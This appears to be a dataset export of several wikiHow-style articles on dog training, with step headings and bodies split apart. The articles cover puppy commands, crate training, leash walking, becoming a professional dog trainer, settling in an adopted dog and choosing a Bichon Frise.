Eventually phase out the treats so that your puppy can sit on command without a reward.

, Now that she can sit, teach her to stay seated. It's a slightly more complicated process, but the same command and reward system is used. Tell your dog to sit, and when she does, say ""stay"" and wait a few seconds. If she moves, tell her to ""sit,"" then try again. When she successfully stays, reward her with treats and praise.


After she has learned how to stay in one place for about 10 seconds, start walking away after you tell her to stay. If she follows you, turn around and tell her to ""sit."" Say stay and walk away again. Be sure to reward her when she gets it right.
Some puppies respond well to a hand signal with the ""stay"" command. Hold up your hand each time you say ""stay."" Eventually your puppy may be able to stay without hearing the verbal command.

, It's easiest to do this with a partner. Have someone hold your puppy across the room or yard. Look at your puppy and say her name. When she looks at you, say ""come"" in a clear voice, and have your partner release her. Say her name again if she doesn't seem to know what to do at first. When she makes her way to you, reward her with praise and treats. Repeat this until she knows that ""come"" means she should run to you.Make it fun for your puppy to come to you by clapping, smiling, and acting excited when she does. Teach her that coming to you is the best thing she can do.
Practice the ""come"" command often in a variety of situations. It's important that your puppy knows to come when she's called, so that when she's in a dangerous situation she doesn't end up getting lost or hurt.

Learn about animal psychology.,
Gain knowledge about the profession.,
Find a volunteer opportunity.",How to Become a Dog Trainer1," In order to be an effective dog trainer, you will need to understand the mind of a dog. In particular, you should do plenty of research about animal behavior. You can start by doing some reading. Look for books by reputable authors that analyze and explain why dogs behave in certain ways.The Association of Professional Dog Trainers (APDT) offers a comprehensive list of educational resources. For example, they recommend books by Sophia Yin (How to Behave So Your Dog Behaves) and Gail Fisher (The Thinking Dog) to further your education. Nicole Wilde, author of It's Not the Dogs, It's the People, is also a great source to read.If you have a dog (or dogs) you can also start to carefully observe his behavior. Take note of different moods or habits, and start keeping a journal of your observations.
Your own dog's vet is a great resource for you. Ask her if she can recommend some reading material for you. You can also ask the reference librarian at your local library to give you pointers on which books to look for.
There are several common behavior patterns you will want to learn about, including: aggression, food guarding, barking, and whining. You can do some of your research online by looking at websites of organization such as the ASPCA and the Humane Society.;
, There are many different types of dog trainers. Take some time to read about possible career paths, and decide which is the most interesting to you. Look for some dog trainers in your area and ask if they would mind talking to you about what they do each day. This type of personal information can help you to make an educated decision.Aside from basic obedience dog trainers, there are many other specializations. For example, you could consider training dogs for medical purposes. One way to do this is to become a trainer for seeing eye dogs.
As a dog trainer, you could also consider training police or military dogs. These animals are trained in supporting officers, and are sometimes used to find missing people or to alert officers to illegal drugs or bombs.
Another career path is to become a trainer who works with dogs who appear in movies and on television. You would likely need to live in an area where films are made to pursue this option.

, Even if you have a lot of experience working with your own dogs, as a trainer you will need to be comfortable with other people's animals. A great way to gain more experience is to find a volunteer opportunity. Look for a local animal shelter and ask if they have room for another volunteer.Some programs will let volunteers assist with training dogs. Ask the person in charge of your local shelter if that is a possibility. It's a great way for you to get some hands on experience.
Volunteering can help you make sure that this is the right career path for you. Many shelter dogs suffer from behavioral problems. Being a volunteer can give you a good idea of what you can expect if you make training your career.
Consider becoming a foster home for dogs in need. This involves caring for dogs while they are between a shelter and a permanent home, and can last anywhere from 24 hours to several weeks or months. Fostering dogs is a great way for you to learn to interact with a lot of different breeds and personalities. Ask your local shelter if they have a foster program.

Train when your puppy is old enough.,
Use the correction and reward method.,
Teach your puppy to come to you.,
Train your puppy to sit.,
Get your puppy to stay.,
Teach your puppy to lie down on command.,
Train your dog to heel.,
Stay consistent.",How to Introduce Training to a New Puppy1," Puppies will be ready to learn basic commands at around 12-16 weeks old. Prior to that, you can prepare your puppy for this training by teaching it about praise at around 8 weeks old. Offer it ample affection and encouragement anytime it does something you ask (e.g. coming to you when called)., This training should be done using the correction and reward method. Correction involves speaking firmly without yelling or any physical punishment. The reward component should involve giving your puppy anything that it enjoys upon completing a task, such as favorite toys or treats when it sits upon command., Teaching your puppy to come to you on command is a simple but important training step that can keep your dog out of trouble (e.g. to keep your puppy from running off or approaching a dangerous situation). Start by squatting down in front of your puppy, opening your arms, and saying ""come here"". If your puppy moves toward you, offer it ample praise as well as a pat on the belly or head.If your puppy does not come to you, gently approach it, attach its leash, and guide it towards the spot you called it to, praising it along the way to create positive associations.

, Kneel in front of your puppy and hold a treat in front of it. Slowly lift the treat above its head, which should prompt it to sit. Praise your puppy and give it the treat.If your puppy doesn't sit, place your hand on its behind and gently guide it into a sitting position, immediately offering praise along with the treat once it's sitting.

, Once you've taught your puppy how to sit on command, you can teach it to stay. Have your puppy sit, with its leash attached, and turn around to face it. Holding the leash slack, gently back up while holding your hand (palm up) to your puppy's face, saying ""stay"".If your puppy gets up before you say a release word (e.g. ""ok"" or ""go""), gently repeat the step.

, Kneel next to your puppy and gently place on hand on its shoulders. Hold a treat in front of its face and give the command ""lie down"", slowly lowering the food in front of its face towards the ground and guiding it downward with the other hand. Once your puppy is all the way down, praise it and give it the treat., Teaching your puppy to heel means ensuring it stays by your side when out for a walk. Use a squeaky toy to keep your puppy's attention during training by holding it in one hand, and your puppy's leash in another. Cross the hand with the toy across your body to hold the toy above your puppy's head, and praise your puppy for following the toy (and you) at the pace you set., Your puppy will learn better and faster if you are consistent. Talk to everyone who interacts with the puppy to make sure they use the same commands and signals for the same thing. If, for example, ""down"" typically means lie down, make sure other's don't use it to mean get off the furniture. Keep your puppy's practice consistent.It's also important to consider your puppy's limits. They will have a shorter attention span and need to sleep more than older dogs. Try to keep training fun and upbeat, and try to avoid getting angry while your puppy is still learning. Be patient and consistent, and the rest will follow.

Let your puppy get tired before the walk.,
Teach her to stand still while you put the leash on.,
Use the red light, green light method.",How to Train Puppies4," Puppies tend to pull on their leashes because they're full of extra energy and excited to be outside. If possible, tire your puppy out by playing with her before you put her on a leash for the day.Try throwing your puppy's favorite ball for her for about 10 minutes before you try to put on her leash.

, Puppies often get excited when it's time to go outside, jumping up on their owners and barking in anticipation of going on a walk. This problem can go on for years if you don't resolve it while your puppy is still young.


If your puppy barks and jumps on you when you pick up a leash, wait until she is completely calm before putting it on. Do this over and over until she learns that she won't get to go outside until she behaves., Start walking with your puppy outside. When she runs ahead and pulls on the leash, halt. Wait for her to turn around, say ""come,"" and when she's at your side, tell her to ""sit."" Reward her with a treat, then continue walking. Repeat the process until she learns to walk alongside you instead of pulling on the leash.When your puppy walks beside you, reward her frequently so she knows that's where she's supposed to walk.
Continue using the red light, green light method for a few weeks. It may take awhile before your dog learns not to pull you down the street.

Decide on training cue words and stick with them.,
Apply the rules at all times.,
Find your puppy’s motivation.,
Use a clicker.,
Understand that punishment is not an effective training method.,
Keep training sessions short but regular.,
Choose a 'good' dog name and a 'bad' dog name: Make sure that your puppy associates his name only with good things.",How to Train Puppies5," Make sure that all members of your household use the same words to train your puppy. If you are using different words from other members of your household, then your puppy may get confused and take longer to learn.For example, to train your dog to sit. Have everyone use the word “sit.” Don’t vary this command at all. In other words, don’t say “sit down” or “stay” to get your puppy to sit. Only use the cue word “sit” or your puppy may become confused.

, Make sure that you observe the rules that you have put in place at all times. Do not apply the rules half of the time or bend them on certain occasions.For example, if you do not want the puppy to get up on your furniture, then enforce this rule at all times. If you make him stay off the furniture during the week, but then allow him on the sofa over the weekend, he will end up getting up on the sofa more and more.

, Training works best when good behavior is rewarded. You can reward your puppy with a tasty treat, by playing a game with his favorite toy, or by making a fuss over him and praising him. Find out what makes your puppy the happiest and use this to reward him when he does something well.Reward your puppy right away. It is important to give your puppy his reward right after he does what you ask him to do.
Over time, you should phase out the treats so that your puppy doesn't get a treat each time he performs the behavior. Doing so teaches him to work harder because he can't take it for granted that he gets a treat every time. Otherwise, he may become lazy. Begin to reduce frequency of treats once your puppy is performing the desired behavior four times out of five.

, Clickers are an effective way to reinforce your puppy’s good behavior and let him know that a treat is coming. It is important to reward your puppy’s good behavior right after he has performed it, but it is not always possible to do so. Using a clicker in your training sessions helps you to reinforce good behavior even when you do not have a treat on hand.Start by teaching your puppy to associate the sound of the clicker with getting a reward.

, Yelling at your puppy or using physical punishment are not effective ways to get him to change his behavior. Your puppy will not understand what he is being punished for and this may lead to more bad behavior.For example, if your puppy makes a puddle on the floor, don't tell him off. If you do, he will just think that you are angry at him for going potty, rather than realize he has defecated in the wrong spot.
Instead of yelling at your puppy if you catch him in the act of defecating in the house, clap your hands to get his attention and make him stop. Then, take him out to his potty spot and wait for him to finish.

, Puppies can't concentrate for long, so keep the sessions short. You should limit your puppy’s training sessions to 5 - 10 minutes. Aim for 2-3 training sessions per day to reinforce the behaviors that you want your puppy to learn.Make sure that you use regular activities as opportunities to train your puppy as well. For example, you could ask your puppy to sit before you put his food down, or praise him when he toilets in the right spot outside.

, Doing so will make him more likely to respond to you at all times. If your puppy links his name to bad things (such as being told off) this may make him reluctant to come when called. Having a name you use only when he's bad will help you to avoid teaching your puppy negative associations with his 'good' dog name.Use your dog’s actual name when he is being good, but then designate another nickname for when he is being bad. For example, if your dog’s name is Charlie, call him Charlie whenever he is being good. If he is being bad, call him Chuckie.

Research programs.,
Receive your certification.,
Find an apprenticeship.",How to Become a Dog Trainer2," You can choose to attend a four year college or university that offers a degree in Animal Behavior. This type of program would give you the most thorough foundation in animal psychology. It also demonstrates to potential employers that you have invested a lot of time and effort into learning the necessary skills to become a dog trainer.Meet with an admissions counselor at a nearby college and ask for information about their degree program in Animal Behavior. Consider the costs and the time that you will need to put in in order to succeed.
If you do not have the time, money, or desire to get a college degree to become a dog trainer, there are other ways to further your education. One way is to go to trade school. Although these programs are not accredited in the same way that colleges are, there are many reputable programs. Do some research online, and read reviews from former students to learn what the experience is like.

, It is possible to earn your certification as a dog trainer without completing coursework. You can contact the Certification Council for Professional Dog Trainers (CCPDT) for more information. However, you should know that you do need to have prior training experience before you can receive your certification. Also, be aware that the CCPDT charges approximately $400 for certification. Once you are certified, the CCPDT requires you to participate in continuing education, which means that you will need to take certain classes and seminars each year.

, One of the best ways to learn the necessary skills is by working closely with an experienced dog trainer. Some training programs include apprenticeships, and the school will set you up with a mentor. Make sure to ask about this part of the program before you choose the coursework that is right for you. If you are not attending classes, you can still get guidance from a professional. Many larger dog training businesses offer internships. Contact the obedience schools in your area to find out if this is an option.
Be aware that interns/apprentices are often paid very little, and sometimes not at all.

Think about your priorities.,
Update your materials.,
Search for potential employers.,
Start your own company.,
Network.",How to Become a Dog Trainer3," As you are completing your training or education, make sure to be thinking about which type of training job you would like to pursue. Are you interested in working with ordinary dog owners who want to have a more obedient pet? Then consider joining a business that focuses on typical obedience methods.If you are interested in a more specialized training career, make sure that you live in the right area. For example, military and police dogs are only trained in certain cities. Are you willing to relocate? These are the types of questions you should ask yourself as you think about your career path.

, Once you decide which type of trainer you want to be, it is time to start actively searching for a job. You should make sure that your resume is updated to reflect your most current level of education and all of your relevant experience. You should also ask several people if they are willing to serve as professional references. Great people to ask are former employers, co-workers, and instructors/professors.Make sure that you have a professional cover letter ready to send out with your resume. It should indicate why you are applying for that particular job and highlight your strengths as a dog trainer.

, You can use job search sites to help you locate places that you might want to work. These are particularly useful because a lot of companies with job openings regularly update their information. If you know where you want to work, you can contact that business directly to see if they have any openings that might be right for you.When you are just starting out, you might consider trying to get a job at a chain pet store. These businesses often have many opportunities for new trainers. There could also be lots of room for advancement.
Use your professional network to learn about potential jobs. Ask people you know in the field and former classmates if they are aware of any openings. Networking is one of the best ways to find a new job.
Ask local dog trainers if they are looking for a partner. Working as part of a small team can be a great way to hone your skills.

, If you start your own business, you can enjoy several perks, such as setting your own hours and being your own boss. When you start a dog training company, make sure you have a clear business plan. Make sure to consider your start up costs, how much you will need to make, and how much to charge clients. Market yourself. Make sure to set aside a portion of your start-up funds for advertising. You might want to print flyers to hang in your neighborhood or buy advertising space on a website.
Use social media. The internet is a powerful tool, and you can use it to your benefit. Get the word out about your new business using sites such as Facebook, Twitter, and LinkedIn. Ask your friends to make sure to ""like"" and share your posts.

, Networking is one of the best ways to either find a job or increase your business. Take time to get to know other members of your professional community. Attend social events and continuing education programs. By spending time with other trainers, you will begin to develop important professional connections.


Join the National Association of Dog Obedience Instructors (www.nadoi.org), the International Association of Canine Professionals (www.canineprofessionals.com) and/or the Association of Pet Dog Trainers (www.apdt.com) where you can network with other trainers online, attend conferences, and continue your education even if you are not a professional trainer just yet.

Wait until the dog sits down on his own.,
Reward him as soon as he sits.,
Keep practicing.,
Eventually, try using the ""sit"" command on its own.",How to Teach a Stubborn Dog to Sit Down1," When you have some free time, grab a small treat and follow your dog around for a few minutes. Don't try to attract his attention or play with him. You just want to watch him while he does whatever he would be doing anyway.;
, Keep a careful eye on your dog without disturbing him. As soon as you notice him get into the ""sit"" position on his own, praise him and give him a small chunk of the treat. Tell him ""sit"" or ""sit down"" in a commanding voice (but not a harsh one). After this, leave the dog alone, but continue to watch him.


You want to come across as affectionate here, not startling. Speak loudly enough to get your dog's attention, but not loudly enough to shock him out of his sitting position.

, Continue to watch your dog. As soon as he sits again, offer him another piece of the treat, praise him, and give the ""sit"" command. Repeat this process each time your dog sits on his own.


Use short practice sessions — 5-10 minutes should be long enough. Don't continue for longer, otherwise he will associate ""Sit"" (and treats) with boredom. Repeat this every day for a week.

, Over time, the dog will start to associate the sitting position with receiving praise and treats. After about a week of practice, try getting your dog's attention and giving the ""sit"" command. If he responds correctly, praise him and give him a piece of a treat. Now, you can start practicing the command itself.


If your dog hasn't learned the command yet, keep practicing. Some dogs take longer than others to learn new tricks.

Buy a crate.,
Make the crate comfortable.,
Shut the door with your puppy inside.,
Monitor the time carefully.,
Leave the house.,
Continue crating your puppy while you are home.,
Crate your puppy overnight.",How to Introduce Training to a New Puppy2," Crate training is a way to condition your puppy's behavior, help with house training, and stop it from acting out. A dog’s crate should be a place it feels safe in and wants to inhabit. Buy a crate that will accommodate your puppy when it has grown to its full size. Your puppy should have just enough room to stand up, turn around, and lie down comfortably, so use a divider to block off part of the crate while your puppy is still small.Visit the Association of Professional Dog Trainers website at https://apdt.com/resource-center/choosing-right-crate-size/ to see what size crate your fully grown dog will need.

, Make the crate inviting and comfortable by lining it with a soft blanket, and leave it out with the doors open so that your puppy can explore it on its own. Use treats and toys to encourage it to go inside. Start feeding your puppy meals inside the crate to increase its comfort and positive associations with it., Gradually start to close the door when your puppy is inside of the crate, for a few seconds at a time at first (preferably while your puppy is eating a meal). Stay close to the crate to reassure the puppy. If the puppy seems okay with being in the closed crate, try leaving the room for very short periods of time (i.e. a minute or two), and reward and praise it heavily once you come back and open the crate. Stay outside for longer, gradually., Be mindful of how long you leave your puppy in its crate. Puppies younger than 6 months old should not be crated for periods of more than 3-4 hours as they have to eliminate more frequently than older dogs. Crate training uses a dog's natural inclination to preserve its ""den"" and avoid soiling it, making it a good strategy for house training. As time goes on, your puppy will learn to hold on and relieve itself when let out.One common rule of thumb for how often you should let your puppy out is an hour for every month of age. So a two month old puppy should be let out every two hours or so. In addition to that, they should be taken out immediately after waking up, playing, and eating or drinking., Keep training your puppy by leaving it in the crate alone in a room for longer and longer periods of time. Once you hit the 30 minute mark, try leaving the house with it crated. Lead it into the crate about 15-20 minutes before you step out so it doesn't start to associate time in its crate with you leaving. Be calm and subtle about leaving and returning, to avoid getting your puppy riled up., Make sure to keep crating your puppy while you are at home, and not just when you leave the house. It is important that your dog's crate feels like its safe place, regardless of what is occurring around it. When your dog is grown, you should be able to leave the crate out (unlocked) as a refuge for your pet, and use it periodically for transport., Try crating your puppy overnight, keeping the crate in your bedroom at first so that you can let your puppy out if it needs to relieve itself during the night. When your puppy starts sleeping through the night without trouble (e.g. whining to be let out), try moving it to another room. As your puppy gets older, it should sleep through the night without anxiety."

Get your dog to focus on a treat in your hand.,
Hold the treat above your dog's head.,
Give the ""sit"" command.,
Reward the dog as soon as she sits.",How to Teach a Stubborn Dog to Sit Down2," Using treats, you can lure the dog into the ""sit"" position easily. Start by holding a treat in your hand. Move it in front of the dog's nose for her to smell, but don't let her have it. You should get your dog's attention quickly.

, Once you have her attention, slowly bring the treat up over her head. Her nose should follow the treat. As you move higher and higher, the dog will have a harder time following the treat. Eventually, she'll need to sit down to keep her nose on it.

, Before your dog sits, ask her to ""sit"" in a clear, commanding tone. Do this every time you practice the command, so that your dog will associate the verbal cue with the act of sitting.

, Your dog should eventually sit down as the treat goes over her head. At this point, you should give her the treat and praise her with affection.


To continue practicing, let your dog lose interest, then repeat the process again. Practice for 5-10 minutes at a time for at least a week or so.

"
"
For best results, practice in a wide variety of situations.,
Be open to rewards besides treats.,
Make sitting a prerequisite for things the dog likes.,
Give your dog a gentle push in the right direction if he needs it.",How to Teach a Stubborn Dog to Sit Down3," Dogs are easily distracted by new places and situations. If your dog learns how to do the ""sit"" command perfectly alone in your kitchen, you may not be able to count on her to do it when she's at the park with her canine companions. Teach your dog to sit in many different environments to ensure that you can always count on her to obey you when it counts.


You may want to make the command part of your daily routine. For example, you can try doing it when you put her leash on, before going through doorways together, before she is fed, before you throw a ball, when she's around other dogs, or whenever else you think it's suitable.

, You don't have to feed your dog treats to reward her for good behavior. Almost anything that your dog likes can be used as an incentive, so don't be afraid to get creative! The main goal is to have your dog associate sitting with positive feelings — this doesn't necessarily have to mean food. A few more ideas you may want to consider include:


Play time
A favorite toy
Love, affection, and petting
Encouraging, praising words

, Once your dog is good at sitting, you can make your life as a dog owner easier by teaching him to sit to get what he wants. Make it a habit to command your dog to sit for his food, to get his leash put on, to get let out to go to the bathroom, and so on. As long as you are consistent, your dog should eventually learn that the best way to get these things is to sit and be quiet — not to bark, beg, and bother you!

, Most dogs shouldn't be too hard to train with either of the methods above. If your dog just doesn't seem to understand what you want when you're training him to sit, try pushing gently downward on the dog's lower back as you command him to sit. As soon as he gets into the correct position, praise and reward him as you normally would.


Be gentle here. It's never a good idea to use violence or intimidation when teaching a dog commands. Not only does this run the risk of confusing the dog, but also risks inflicting lasting psychological damage.

Get some treats that your dog likes.,
Choose an environment with few distractions, such as your backyard.,
Keep training sessions relatively short to begin with.,
Be realistic about the speed of progress.",How to Train an Adult Dog1," Take small pieces so that you can give it one for each thing it does without worrying about your dog getting fat.Some dogs, especially Labradors and Beagles, are extremely food orientated, and so you can set aside a portion of their daily kibble into a treat pouch, and use this to reward them.;
, You want the dog to listen to you, rather than watching other dogs having fun in the park. During the early stages of training, when you aren't sure of your dog's response, keep your pup on a leash. This saves unnecessary shouting to get its attention if it starts to wander off. Instead, just gently reel your dog in.Once your dog has learned basic commands, then you can continue lessons with distractions - indeed this is beneficial because it helps him understand you expect to react under all circumstances, rather than just in the yard.

, A typical training program involves two daily sessions of 10 - 20 minutes each. Also reinforce commands by asking the dog to ""sit"" before meals, or ""stay"" when you go to get his or her lead.Different dogs have different attention spans, (just as human personalities differ so do dogs). However, some breeds are more trainable, meaning they have strong powers of concentration. These include German shepherd dogs, Border collies, Labradors, and dogs that were originally bred as hunting dogs.

, Yes, you can teach an old dog new tricks, but it takes longer. Don't expect him to pick things up as quickly as a young puppy within their socialization period. However, do not be discouraged if progress is slow. – Stick with it and you will be rewarded in the end.

The warm, enclosed space gives your dog the feeling of a “den,” and it also makes potty-training easier if your new dog isn’t housebroken.You can make the crate particularly welcoming by tucking a soft bed or old t-shirt inside, as well as some chew toys and a few treats.


Be sure that the crate is well-ventilated, and also that your dog has just enough room to stand up, turn around, and lie down within it.
Never leave a puppy in the crate for extended periods of time, and don’t ever send your dog to the crate as a punishment. If you do, your dog will learn to dread the crate and stop thinking of it as a safe shelter.;
, Pet food is big business these days, leaving the market flooded with different brands, flavors, and varieties of dog food. In order to sift through the abundant offerings, ask your vet to recommend a healthy, well-balanced food for your dog. Ultimately, you want to choose a kibble with one or two whole proteins as the first and second ingredients listed.You may want to ask the shelter or breeder what food your dog was eating prior to adoption. That way you can give your new dog the familiar food for the first few days in its new home.

, Whether you’re adopting from a shelter or buying from a pet store, you should obtain records and information regarding your dog’s health, ownership history, certification, and any behavioral problems or history of abuse. Knowing this background will help you make your dog’s transition period go smoothly.For example, if your dog has a history of violence or abuse, you should take care to make the transition particularly low-key. Keep contact with children minimal and controlled, lower music volume, and monitor household traffic.

, Once your dog gets used to its new home and house rules, you won’t have to be so careful with proofing your home. While your dog is still acclimating, though, you should expect it to be curious about all the unfamiliar sights and smells. In order to make sure it doesn’t get into something dangerous or messy, install locks on cabinets containing harmful household chemicals. Put your shoes, leather goods, and other chewable items out of reach, and tie up or remove any exposed cords and wires.You should also make sure that you keep all closet and outer doors closed so that your new dog stays enclosed in a specific, prescribed area. If other people live in your home, ask them to keep doors closed as well.
Store your dog kibble in a locked cabinet as well so that your dog can’t rip into the bag and gorge while you’re away. Also be sure not to leave human food out on low tables or counters where your dog could get to it, as foods such as dried fruit, chocolate, onion, and garlic are particularly harmful to dogs., A yard can be a great resource for your dog, giving it a large space to run around in while you’re doing something else. If you’re not careful, though, your dog can escape through a weak spot in the fence or a hole in the wire. Do a thorough sweep of your enclosure before letting your new dog out to run around, fixing any weak spots or filling up any holes as you go along.You should also make sure that any trash bins, sharp tools, swimming pools, or toxic garden flowers are secure and inaccessible to your dog., Even if your new dog is an adult and won’t be going through teething, you should expect chewing and gnawing to be one of its favorite pastimes. Put out plenty of hard rubber toys so that it won’t opt for furniture and household items instead. If your dog likes soft, plush toys, check the label and make sure they’re dog- and child-safe, meaning they don’t contain any hazardous materials or squeakers which they could choke on.In general, you should avoid rawhide and animal bones. Your dog might love them, but they can splinter and cut your dog’s gums, or break off and get swallowed.

, Your dog’s leash and collar should be sturdy and secure, but also large enough to permit comfortable breathing. Most organizations and breeders recommend nylon or leather collars and leashes, and also that you buy an adjustable variety so you can make it wider or narrower depending on your dog’s growth.Never use choke-chains or collars with rings, as these can get caught on your dog’s teeth and become a choking hazard.

, Ideally, you can get your other pets out of the house entirely when you bring your new dog into it. That way, the dog can explore its new digs without feeling threatened by resident dogs or animals acting in a territorial fashion. If you can’t get a friend or family member to take them for a few hours, put them in a separate room or the backyard where they can’t be heard barking or growling.


Also be sure to keep any cat bowls, litter boxes, and bedding in a safe place which your new dog can’t reach., As soon as you get home from the shelter or breeder, take your dog for a walk. It will be a fun bonding experience for the two of you, and it will allow your dog to relax and release some of its pent-up energy and anxiety.Take it slow if your dog appears uncomfortable with the leash and collar. Avoid retractable leashes until your dog is accustomed to being led.

, Your new dog will only become more anxious and slow to acclimate if you bark orders or scream with frustration. Even if it does something wrong during the transition period, try to keep a low, soothing tone and avoid frightening or threatening reproaches.Be aware of other noises which could alarm your new dog. Loud music, honking cars, shouting children, or blaring televisions can all shock a dog and make it associate its new environment with fear and distress., Giving your new dog treats frequently during its first day in the new home will help you build a positive and trusting relationship, as well as show your dog that it will be rewarded for positive behavior. Start handing them over while you’re still in the car on the way home, and keep it up every time your dog does something good.Check the label on your treats before your purchase them, as some dog treats are basically canine junk food, filled with preservatives, sodium, and low-quality components., Remember that a dog’s transition to a new home is stressful, effectively changing everything about its surroundings and routine. You can alleviate this stress by giving your dog space and providing a quiet environment. Throughout the first day, show your dog that it’s free to withdraw at any time to its crate and, if possible, keep the crate in a room where other people or animals won’t be around consistently.Also give the new dog access to as much of the house as possible so that it can ‘meet’ any resident people or animals by smell before meeting face-to-face., After your dog has explored the house for a few hours and gotten some rest, start introducing it to family, friends, housemates, or anyone who lives in the home with you. It’s important to do this on the first day so that your dog becomes comfortable with anyone it will see and interact with on a frequent basis.Make introductions one at a time so that your new dog doesn't become overwhelmed.


It’s especially crucial to do this step if your new dog belongs to a territorial breed. If you wait too long to introduce new people to these kinds of dogs, they can have a hard time getting acquainted and even become aggressive.

, Once your dog has explored its new digs, take it for a walk with your resident dogs. This will let them meet, sniff, and play with each other while located on neutral ground. Keep their leashes on so that you can supervise the interaction and pull them away from one another if things get too heated or frisky.When you get back to the house, have them play off-leash in the backyard for awhile. This area is less neutral than the street or dog park, but it’s also a good, intermediate level before bringing them into the house together.If you don’t have a yard, move the dogs into the house separately and put them in different rooms.

, Once your dogs have interacted in neutral territory, let them do so within the house. If you’re worried about fights escalating quickly, keep their leashes on but let them drag on the floor so that you can pick them up when necessary. After some brief, indoor play time, separate the dogs again by putting them in different rooms or separate crates.


Ask your vet or a dog behavior specialist for help if one of your dogs has a history of intra-species aggression. You might need to use a muzzle for a while, or your vet might recommend against taking in a new dog entirely.

, After keeping your cat separate for a few hours, put your new dog on the leash and open the door to the room where your cats have been sequestered. This will allow your cat to see the friendly interloper and to decide how it wants to handle the interaction. If it wants to hiss and stay put on a high shelf in the other room, let it do so. If it wants to come out and sniff your dog, let the two of them get acquainted.Your cat might not want to mingle for several hours or even days, so just make sure that they have a lofty perch where they can see your new dog and get used to its presence without having to interact.

Consider whether an active dog fits your lifestyle.,
Be sure you can take your Bichon outdoors.,
Think about whether your family will be compatible with a Bichon.,
Consider that you will need to puppy-proof your house.,
Groom a Bichon Frise often.,
Be around a Bichon Frise as much as you can.,
Prepare for possible ailments or diseases.,
Take your time picking a dog.,
Work on “sit” and “stay.” Since these dogs are energetic and curious, they might have a bit of a tendency to rush towards the front door when it opens, or pull hard on the leash when walking.,
Prepare for house training to take a while.,
Use positive reinforcement.,
Consider pursuing crate training.",How to Know if a Bichon Frise Is the Right Dog Breed for You," The Bichon Frise is a small dog with a medium activity level. He will likely have a few blasts of energy throughout the day. Having another dog around the house will help him get out most of this energy, or just taking him for one or two short walks for about 15 minutes each day.If you don’t have the patience for a dog running around the house in sudden bursts of energy, or if you aren’t in the physical condition to walk a dog a few times per day, this might not be the breed for you.;
, The Bichon Frise is a small dog, usually only getting up to about 10-20 pounds. So, he would be a good dog for a small house or even an apartment. Still, he does have a lot of energy, so make sure he gets enough outdoor time.If you live in a big city, or if there isn’t anywhere nearby that your dog could run around, you might consider a more mellow breed of dog. Locate neighborhood parks that are dog-friendly.

, These dogs are good with families, but there is a small concern when it comes to small children, or toddlers that are especially energetic. Smaller dogs could potentially be injured from any kind of rough play, and might nip or snap if they feel threatened.For the most part, the Bichon Frise is great with kids and families. They have a friendly, sweet temperament, and if treated nicely, will make great additions to any family.

, This breed is particularly curious and adventurous, and will get into all kinds of things if you let them. You will want to make sure you put up all electrical cords, valuables, and any plants that might be poisonous to dogs.They are also prone to chew on things, to make sure you discourage this behavior early on to prevent it from getting out of hand.
Get down on the floor and see things from their level to spot anything they might be able to get into, chew on, or destroy that might be harmful to them.

, This breed needs daily brushing, starting at about a year of age, after his full coat has grown in. Get him professionally clipped and groomed every 6-8 weeks, just to prevent matting or knotting in his coat. Clip his nails as needed, and use special wipes or cream to remove the tear stains under his eyes.Mats and knots, if allowed to build up too much, could end up causing an infection or skin irritation. Daily brushing should help keep this to a minimum or prevent it all together.

, This breed loves to be around people, and doesn’t do too well being left alone for long periods of time. If you have a long work dark or have to be out of the house most of the day or night, you might consider a different breed. These dogs love attention, and being alone for too long might lead to them becoming anxious or destructive.Their love for attention and closeness makes it easy for them to bond with their new families, and great buddies to have around.

, Fortunately, the Bichon Frise is a mostly healthy dog, and can live long lives into their teen years. But, things like cataracts and hip dysplasia could develop later in their lives. Make sure you are prepared to deal with these health issues should they arise.As a small breed, Bichons have a tendency to have issues with dental hygiene, so getting their teeth cleaned every 2 years is important.
If you get your dog from a breeder and the dog is certified, there should be records that prove the dog has no genetically-passed disorders or diseases. If you adopt your dog, this will likely not be available.

, If you are adopting or picking from a litter with a breeder, remember that not all Bichons are the same. Each dog will have its own personality and energy level. Consider fostering a dog for a short trial period to make sure that particular dog is right for your family, if that option is available to you.


Alternatively, if you are working with a breeder, visit the puppy often before it’s time for him to leave his mother. Spend time with him and see how well you and the puppy get along, how he behaves towards his littermates, and his personality.

, You will want to start training early on to make sure your Bichon can sit and stay on command to avoid him getting lost or put in danger.Fenced yards are safe for these dogs, especially if they aren’t doing too well listening to sit or stay commands. Still, you’ll want to make sure the fence is secure so the dog can’t get over or under it., This breed is known for how difficult they can be to housetrain, so make sure you are prepared for some accidents along the way. Some trainers recommend crate training when working on housebreaking the dog, so consider that option.Sometimes being left alone can contribute to issues with housetraining. The anxiety of being alone can lead to accidents or marking.

, The best method for training a Bichon is to let him know when he’s doing something correctly and praise him for it. Relying on this rather than correcting him or scolding him when he’s done something wrong will be more effective in the long run.Try using training treats. Keep these close by and give your dog one when he does something correctly, like uses the bathroom outside.

, Since this breed is known for difficulties with potty training and separation anxiety, crate training could be beneficial to the dog’s stress levels and housebreaking. Crate training is something you will want to work on right when you bring the dog home, so that he can learn to find comfort in his crate.


These dogs are also known for being a bit mischievous and curious, so crate training will keep the dog away from potential hazards or chewing opportunities at night and while you are out of the house.

Use reward-based training methods.,
Learn how to use clicker training, as it is an excellent method for training dogs.,
Never use a choke chain.,
Do some research on dog training.,
Do not shout at or hit your dog.",How to Train an Adult Dog2," Some training methods advocate out-and-out dominance of the dog, and whilst it's good to be a leader to your dog, it should be based on encouragement rather than harsh correction. Think of your dog as a junior family member who needs to live by the house rules for everyone's benefit.


Reward based training works on the principle of rewarding good behaviors so that the dog wants to repeat them in order to get a treat, whilst bad behavior is ignored, so the dog gets not benefit from it and the behavior eventually stops as a result., This is covered in depth at How to Clicker Train your Dog . The principle is to teach the dog to associate the click-clack of the clicker with a reward or treat. Then you give a cue word and use the clicker to mark the exact moment a desired behavior takes place,, and then reward.


The advantage of using the clicker is that it's a down-payment on a treat, and so can exactly mark the desired behavior in a way that's difficult to do otherwise., They're cruel and not only will your dog probably not like you very much, the choke chain could do irreparable damage to your dog's neck. In fact, dogs have died as a result of wearing choke chains.


A choke chain, prong collar, or electric collar represent lazy or shoddy training. They rely on fear of pain to subdue a dog and make it fearful, rather than encourage it to chose the correct behavior upon request., Borrow and buy books on dog training from your local library and your local bookshop. Read books and articles about dog training, behavior, and psychology so that you understand how dogs think, which gives you a vital edge when training them.

